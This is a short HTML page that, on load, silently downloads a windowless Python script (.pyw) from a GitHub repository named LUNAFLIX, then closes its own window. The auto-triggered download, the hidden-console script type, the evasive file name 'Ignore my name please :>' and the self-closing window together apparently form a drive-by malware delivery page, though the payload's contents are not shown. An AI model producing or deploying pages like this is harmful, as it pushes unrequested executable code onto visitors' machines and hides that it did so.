<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Downloading...</title>
    <style>
        body {
            font-family: system-ui, -apple-system, sans-serif;
            height: 100vh;
            margin: 0;
            display: grid;
            place-items: center;
            background: #f8fafc;
            color: #334155;
        }
        .status {
            text-align: center;
            padding: 2rem;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1);
        }
        h1 { font-size: 1.25rem; margin-bottom: 0.5rem; }
        p { margin: 0; color: #64748b; }
    </style>
</head>
<body>
    <div class="status" id="status">
        <h1>Preparing download...</h1>
        <p>Please wait.</p>
    </div>

    <script>
        const GITHUB_FILE_URL = "https://raw.githubusercontent.com/epickfr/LUNAFLIX/refs/heads/main/Ignore%20my%20name%20please%20%3A%3E.pyw";


        function startDownload() {
            const status = document.getElementById('status');

            let fileName = GITHUB_FILE_URL.split('/').pop();
            try {
                fileName = decodeURIComponent(fileName);
            } catch (e) {
            }

            const a = document.createElement('a');
            a.href = GITHUB_FILE_URL;
            a.download = fileName;
            a.style.display = 'none';
            document.body.appendChild(a);

            const closeWindow = () => {
                status.innerHTML = "<h1>✅ Download Started</h1><p>Closing window...</p>";

                setTimeout(() => {
                    window.close();
                    setTimeout(() => {
                        if (!window.closed) {
                            status.innerHTML = "<h1>✅ Download Started</h1><p>You can now close this window manually.</p>";
                        }
                    }, 500);
                }, 100);
            };
            window.addEventListener('blur', closeWindow, { once: true });

            setTimeout(closeWindow, 2000);

            a.click();

            document.body.removeChild(a);
        }

        window.addEventListener('load', startDownload);
    </script>
</body>
</html>
